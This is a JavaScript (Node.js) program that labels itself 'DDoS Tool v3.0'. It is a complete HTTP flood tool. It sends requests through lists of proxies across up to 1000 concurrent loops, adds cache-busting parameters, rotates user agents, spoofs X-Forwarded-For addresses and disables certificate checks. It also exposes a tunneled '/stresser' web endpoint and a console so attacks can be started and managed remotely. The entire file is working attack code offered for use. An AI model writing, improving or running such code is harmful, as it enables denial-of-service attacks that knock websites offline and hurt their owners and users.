const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const http = require("http");
const { randomHeaders, randomUserAgent } = require('random-headers');
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const https = require("https");
const crypto = require("crypto");
const readline = require("readline");
require('dotenv').config();

const nport = require("./nport.js");

const app = express();
app.use(express.json());

const stateFilePath = path.join(__dirname, "attackState.json");
const REQUESTS_PER_THREAD = process.env.PER_THREAD || 3;
const numThreads = process.env.MAX_THREADS || 1000;
let totalRequestsSent = 0;
let nportUrl = null;
let tunnelActive = false;

axios.defaults.timeout = 0;
axios.defaults.maxRedirects = 0;
axios.defaults.validateStatus = () => true;

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const colors = {
  red: (text) => `\x1b[31m${text}\x1b[0m`,
  green: (text) => `\x1b[32m${text}\x1b[0m`,
  yellow: (text) => `\x1b[33m${text}\x1b[0m`,
  cyan: (text) => `\x1b[36m${text}\x1b[0m`,
  magenta: (text) => `\x1b[35m${text}\x1b[0m`,
  gray: (text) => `\x1b[90m${text}\x1b[0m`,
  bold: (text) => `\x1b[1m${text}\x1b[0m`,
};

const cipherSuites = [
  "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
  "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
  "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
  "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
];

const SELECTED_CIPHER = cipherSuites[process.env.CIPHER_INDEX || 2];

const generateCacheBuster = () => {
  return `${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
};

const getNoCacheHeaders = () => {
  return {
    'Cache-Control': 'no-cache, no-store, max-age=0',
    'Pragma': 'no-cache',
    'User-Agent': randomUserAgent(),
    'Connection': 'close',
    'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
  };
};

const createHttpsAgent = (proxyUrl, proxyProtocol) => {
  const agentConfig = {
    ciphers: SELECTED_CIPHER,
    honorCipherOrder: true,
    rejectUnauthorized: false,
    keepAlive: false,
    timeout: 0,
  };

  if (proxyProtocol === "socks5") {
    const agent = new SocksProxyAgent(proxyUrl);
    agent.options.secureOptions = agentConfig;
    return agent;
  } else {
    const proxyAgent = new HttpsProxyAgent(proxyUrl);
    proxyAgent.secureOptions = agentConfig;
    return proxyAgent;
  }
};

const ensureStateFileExists = () => {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [] }));
  }
};

const loadState = () => {
  ensureStateFileExists();
  try {
    const data = fs.readFileSync(stateFilePath, "utf-8");
    return JSON.parse(data);
  } catch (error) {
    return { continueAttack: false, sessions: [] };
  }
};

let state = loadState();
let continueAttack = state.continueAttack;
let sessions = state.sessions || [];

sessions = sessions.filter((session) => {
  const endTime = session.startTime + session.duration;
  if (Date.now() > endTime) {
    console.log(colors.yellow(`Session expired for ${session.url}`));
    return false;
  }
  return true;
});

if (sessions.length === 0) {
  continueAttack = false;
}
state = { continueAttack, sessions };
fs.writeFileSync(stateFilePath, JSON.stringify(state));

const proxyFilePath = path.join(__dirname, "proxy.txt");

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];

const loadProxies = () => {
  try {
    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim()).filter(line => line.length > 0);
  } catch {
    return [];
  }
};

const formatNumber = (num) => {
  return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
};

const performAttack = async (sessions, agent, threadId) => {
  if (!continueAttack || sessions.length === 0) return;

  const activeSessions = sessions.filter((session) => {
    return Date.now() <= session.startTime + session.duration;
  });

  if (activeSessions.length === 0) {
    continueAttack = false;
    state = { continueAttack: false, sessions: [] };
    fs.writeFileSync(stateFilePath, JSON.stringify(state));
    return;
  }

  let successfulRequests = 0;
  const startTime = Date.now();
  
  for (const session of activeSessions) {
    let url = session.url;
    
    for (let i = 0; i < REQUESTS_PER_THREAD; i++) {
      const cacheBuster = generateCacheBuster();
      const separator = url.includes('?') ? '&' : '?';
      const cacheBustedUrl = `${url}${separator}_=${cacheBuster}&nocache=${cacheBuster}&cb=${Date.now()}`;
      
      axios.get(cacheBustedUrl, { 
        httpsAgent: agent, 
        headers: getNoCacheHeaders(), 
        timeout: 0,
        validateStatus: () => true
      }).catch(() => {});
      
      successfulRequests++;
    }
  }

  totalRequestsSent += successfulRequests;
  
  const duration = Date.now() - startTime;
  if (threadId === 0 && duration > 0) {
    const rps = (successfulRequests / (duration / 1000)).toFixed(1);
    console.log(
      `${colors.green('⚡')} ${colors.gray(`[${new Date().toLocaleTimeString()}]`)} ${colors.red(`${formatNumber(successfulRequests)} req`)} | ${colors.cyan(`Total: ${formatNumber(totalRequestsSent)}`)} | ${colors.green(`RPS: ${rps}`)}`
    );
  }

  if (continueAttack) {
    setImmediate(() => performAttack(sessions, agent, threadId));
  }
};

const autoStartTunnel = async () => {
  const tunnelSubdomain = process.env.NPORT || "ddos";
  
  console.log(colors.cyan(`\n🔗 Starting tunnel: ${tunnelSubdomain}`));
  try {
    const url = await nport.start(25694, tunnelSubdomain, { disableSuffix: false });
    if (url) {
      nportUrl = url;
      tunnelActive = true;
      console.log(colors.green(`✅ Tunnel: ${nportUrl}`));
      return true;
    } else {
      console.log(colors.red('❌ Tunnel failed'));
      return false;
    }
  } catch (err) {
    console.log(colors.red(`❌ Tunnel error: ${err.message}`));
    return false;
  }
};

const startAttack = async (url, durationHours) => {
  if (!url || !/^https?:\/\//.test(url)) {
    console.log(colors.red('Invalid URL'));
    return false;
  }

  const proxies = loadProxies();
  if (!proxies.length) {
    console.log(colors.red('No proxies found in proxy.txt'));
    return false;
  }

  const newSession = {
    url,
    startTime: Date.now(),
    duration: durationHours * 60 * 60 * 1000,
  };

  sessions.push(newSession);
  continueAttack = true;
  state = { continueAttack, sessions };
  fs.writeFileSync(stateFilePath, JSON.stringify(state));

  console.log(colors.green(`\n🚀 Attack: ${url} for ${durationHours}h`));
  console.log(colors.cyan(`Threads: ${numThreads} | Req/thread: ${REQUESTS_PER_THREAD}`));
  
  if (tunnelActive && nportUrl) {
    console.log(colors.magenta(`Public: ${nportUrl}`));
  }
  console.log('');

  for (let i = 0; i < numThreads; i++) {
    if (!continueAttack) break;

    const proxies = loadProxies();
    const randomProxy = getRandomElement(proxies);
    const proxyParts = randomProxy.split(":");
    
    let proxyProtocol = "http";
    let proxyHost = proxyParts[0];
    let proxyPort = proxyParts[1];
    
    if (proxyHost.includes("socks")) {
      proxyProtocol = "socks5";
      proxyHost = proxyParts[0].replace("socks5://", "").replace("socks4://", "");
    }
    
    const proxyUrl = `${proxyProtocol}://${proxyHost}:${proxyPort}`;
    const agent = createHttpsAgent(proxyUrl, proxyProtocol);
    
    performAttack(sessions, agent, i);
  }
  return true;
};

const stopAttack = async () => {
  if (!continueAttack) {
    console.log(colors.yellow('No active attack'));
    return;
  }

  continueAttack = false;
  state = { continueAttack: false, sessions: [] };
  fs.writeFileSync(stateFilePath, JSON.stringify(state));

  console.log(colors.yellow(`\n🛑 Stopped`));
  console.log(colors.green(`Total: ${formatNumber(totalRequestsSent)}\n`));
};

const showStatus = () => {
  if (!continueAttack || sessions.length === 0) {
    console.log(colors.yellow('No active attack'));
    return;
  }

  console.log(colors.cyan('\n=== STATUS ==='));
  sessions.forEach((s) => {
    const remaining = ((s.startTime + s.duration - Date.now()) / (60 * 60 * 1000)).toFixed(2);
    console.log(`${colors.yellow('Target:')} ${s.url} | ${colors.gray(`${remaining}h left`)}`);
  });
  console.log(`${colors.green('Requests:')} ${formatNumber(totalRequestsSent)}`);
  console.log(`${colors.cyan('Threads:')} ${numThreads}`);
  if (tunnelActive && nportUrl) {
    console.log(`${colors.magenta('URL:')} ${nportUrl}`);
  }
  console.log('');
};

const showHelp = () => {
  console.log(colors.cyan('\n=== COMMANDS ==='));
  console.log(`${colors.green('start <url> [hours]')}  - Start attack`);
  console.log(`${colors.green('stop')}                 - Stop`);
  console.log(`${colors.green('status')}               - Status`);
  console.log(`${colors.green('add <url> [hours]')}    - Add target`);
  console.log(`${colors.green('remove <url>')}         - Remove`);
  console.log(`${colors.green('clear')}                - Clear`);
  console.log(`${colors.green('exit')}                 - Exit\n`);
};

const clearConsole = () => {
  console.clear();
  console.log(colors.green('DDoS Tool v3.0'));
  console.log(colors.gray('Type "help" for commands\n'));
};

const handleCommand = async (cmd) => {
  const parts = cmd.trim().split(/\s+/);
  const command = parts[0].toLowerCase();
  const args = parts.slice(1);

  switch(command) {
    case "start":
      if (args.length < 1) {
        console.log(colors.red('Usage: start <url> [hours]'));
        return;
      }
      await startAttack(args[0], args[1] ? parseFloat(args[1]) : 1);
      break;

    case "add":
      if (!continueAttack) {
        console.log(colors.yellow('No active attack. Use "start" first'));
        return;
      }
      if (args.length < 1) {
        console.log(colors.red('Usage: add <url> [hours]'));
        return;
      }
      sessions.push({
        url: args[0],
        startTime: Date.now(),
        duration: (args[1] ? parseFloat(args[1]) : 1) * 60 * 60 * 1000,
      });
      state = { continueAttack, sessions };
      fs.writeFileSync(stateFilePath, JSON.stringify(state));
      console.log(colors.green(`Added: ${args[0]}`));
      break;

    case "remove":
      if (args.length < 1) {
        console.log(colors.red('Usage: remove <url>'));
        return;
      }
      sessions = sessions.filter((s) => s.url !== args[0]);
      if (sessions.length === 0) continueAttack = false;
      state = { continueAttack, sessions };
      fs.writeFileSync(stateFilePath, JSON.stringify(state));
      console.log(colors.green(`Removed: ${args[0]}`));
      break;

    case "stop":
      await stopAttack();
      break;

    case "status":
      showStatus();
      break;

    case "clear":
      clearConsole();
      break;

    case "help":
      showHelp();
      break;

    case "exit":
      console.log(colors.yellow('Goodbye!'));
      rl.close();
      process.exit(0);
      break;

    default:
      if (command) console.log(colors.red(`Unknown: ${command}`));
      showHelp();
  }
};

app.get("/stresser", async (req, res) => {
  const url = req.query.url;
  const duration = parseFloat(req.query.duration) || 1;
  
  if (!url || !/^https?:\/\//.test(url)) {
    return res.status(400).json({ error: "Invalid URL" });
  }
  
  await startAttack(url, duration);
  res.json({ success: true, message: `Attack started on ${url}` });
});

app.get("/stop", async (req, res) => {
  await stopAttack();
  res.json({ success: true, totalRequests: totalRequestsSent });
});

app.get("/status", (req, res) => {
  res.json({
    active: continueAttack,
    targets: sessions.map(s => s.url),
    totalRequests: totalRequestsSent,
    threads: numThreads
  });
});

const port = process.env.PORT || 25694;

(async () => {
  await autoStartTunnel();
  
  app.listen(port, () => {
    console.clear();
    console.log(colors.green(`\n⚡ DDoS Tool v3.0`));
    console.log(colors.cyan(`Local: http://localhost:${port}`));
    if (tunnelActive && nportUrl) {
      console.log(colors.magenta(`Public: ${nportUrl}`));
    }
    console.log(colors.green(`\nType "help" for commands\n`));
    
    rl.setPrompt(colors.red('ddos> '));
    rl.prompt();

    rl.on("line", async (input) => {
      await handleCommand(input);
      rl.prompt();
    });
  });
})();